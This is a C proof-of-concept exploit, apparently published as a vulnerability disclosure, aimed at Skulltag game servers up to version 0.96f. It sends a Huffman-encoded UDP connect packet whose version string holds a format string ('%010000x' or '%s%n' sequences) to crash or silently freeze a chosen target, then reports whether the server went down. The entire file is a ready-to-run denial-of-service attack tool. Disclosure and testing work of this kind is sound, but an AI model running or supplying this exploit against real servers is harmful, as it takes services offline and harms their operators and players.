/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "sv_huffman.c"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <sys/param.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define stristr strcasestr
    #define ONESEC  1
#endif



#define VER                 "0.1"
#define PORT                10666
#define BUFFSZ              10000
#define TWAIT               5

#define PUT32(x,y)          *x++ = y         & 0xff; \
                            *x++ = (y >> 8)  & 0xff; \
                            *x++ = (y >> 16) & 0xff; \
                            *x++ = (y >> 24) & 0xff;

#define FORMATSTRING1       "%010000x"
#define FORMATSTRING2       "0.%s%n%s%n%s%n%s%n"

#define	CONNECT_CHALLENGE   200
#define	CONNECT_READY       201
#define	CONNECT_GETDATA     202
#define	CONNECT_QUIT        203
#define SVINFO              199
#define NETWORK_ERROR       254



u_char *skulltag_info(u_char *p);
void delimit(u_char *data);
int mycpy(u_char *dst, u_char *src);
int doom_send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
int timeout(int sock, int sec);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    int     sd,
            effect,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ],
            *ver,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Skulltag <= 0.96f format string " VER "\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <effect> <host> [port(%hu)]\n"
            "\n"
            "Effect:\n"
            " 1 = immediate termination of the server (%s)\n"
            " 2 = silent server freeze (%s)\n"
            "\n", argv[0], port, FORMATSTRING1, FORMATSTRING2);
        exit(1);
    }

    effect = atoi(argv[1]);

    if(argc > 3) port    = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    HuffInit();

    p = buff;
    PUT32(p, SVINFO);
    PUT32(p, 0x001f7fff);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    len = doom_send_recv(sd, buff, p - buff, buff, sizeof(buff), 1);
    close(sd);

    if(len > 4) {
        ver = skulltag_info(buff);
    }

    printf("- send malformed packet:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    p = buff;
    *p++ = CONNECT_CHALLENGE;
    if(effect == 2) {
        printf("- send version %s\n", FORMATSTRING2);
        p   += mycpy(p, FORMATSTRING2);
    } else {
        printf("- send version %s\n", FORMATSTRING1);
        p   += mycpy(p, FORMATSTRING1);
    }
    p   += mycpy(p, "");
    *p++ = 0;
    *p++ = 0;
    len = doom_send_recv(sd, buff, p - buff, buff, sizeof(buff), 0);
    close(sd);

    if(len > 0) {
        p = NULL;
        if(buff[0] == NETWORK_ERROR) p = buff + 1;
        if(buff[5] == NETWORK_ERROR) p = buff + 6;
        if(p) {
            if(*p == 0) {
                /*
                printf("\n- server is protected with password, insert the keyword:\n  ");
                fgets(password, sizeof(password), stdin);
                delimit(password);
                continue;
                */

            } else if(*p == 1) {
                /*
                ver = strdup(p + 1);
                printf("\n- set version %s\n", ver);
                continue;
                */

            } else if(*p == 2) {
                printf("\nError: you are banned\n\n");
                exit(1);

            } else if(*p == 3) {
                printf("\nError: server is full, retry later\n\n");
                exit(1);

            } else {
                printf("\nError: client has not been accepted (%d)\n\n", *p);
                exit(1);
            }
        }
    }

    printf("- check server:\n");
    p = buff;
    PUT32(p, SVINFO);
    PUT32(p, 0x001f7fff);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    len = doom_send_recv(sd, buff, p - buff, buff, sizeof(buff), 0);
    if(len < 0) {
        printf("\n  Server IS vulnerable!!!\n\n");
    } else {
        printf("\n  Server doesn't seem vulnerable\n\n");
    }

    close(sd);
    return(0);
}



u_char *skulltag_info(u_char *p) {
    int     i,
            dunno,
            wadnum;
    u_char  *ver;

    printf("\n");
    dunno = p[0] | (p[1] << 8) | (p[2] << 16) | (p[3] << 24);   p += 4;
    ver   = strdup(p);
    printf("  version        %s\n", p);                         p += strlen(p) + 1;
    /* ID */                                                    p += 4;
    printf("  hostname       %s\n", p);                         p += strlen(p) + 1;
    printf("  wad URL        %s\n", p);                         p += strlen(p) + 1;
    printf("  e-mail         %s\n", p);                         p += strlen(p) + 1;
    printf("  mapname        %s\n", p);                         p += strlen(p) + 1;
    printf("  max clients    %hhu\n", *p++);
    printf("  max players    %hhu\n", *p++);
    printf("  wads           ");
    wadnum = *p++;
    for(i = 0; i < wadnum; i++) {
        printf("%s ", p);                                       p += strlen(p) + 1;
    }
    printf("\n");
    printf("  gametype       %hhu\n", *p++);
    printf("  gamename       %s\n", p);                         p += strlen(p) + 1;
    printf("  iwad           %s\n", p);                         p += strlen(p) + 1;
    printf("  password       %hhu\n", *p++);
    printf("  join password  %hhu\n", *p++);
    printf("  gameskill      %hhu\n", *p++);
    printf("  botskill       %hhu\n", *p++);
    /* the rest is useless */
    return(ver);
}



void delimit(u_char *data) {
    while(*data && (*data != '\n') && (*data != '\r')) data++;
    *data = 0;
}



int mycpy(u_char *dst, u_char *src) {
    u_char  *p;

    for(p = dst; *src; src++, p++) {
        *p = *src;
    }
    *p++ = 0;
    return(p - dst);
}



int doom_send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
    int     len;
    u_char  buff[BUFFSZ];

    HuffEncode(in, buff, insz, &len);
    len = send_recv(sd, buff, len, out ? buff : NULL, sizeof(buff), err);
    if(len > 0) HuffDecode(buff, out, len, &len);
    return(len);
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
    int     retry,
            len;

    if(in && !out) {
        if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        return(0);

    } else if(in) {
        for(retry = 3; retry; retry--) {
            if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
            if(!timeout(sd, 2)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            fputs("\nError: socket timeout, no reply received\n\n", stdout);
            exit(1);
        }

    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) std_err();
    return(len);
}



int timeout(int sock, int sec) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = sec;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


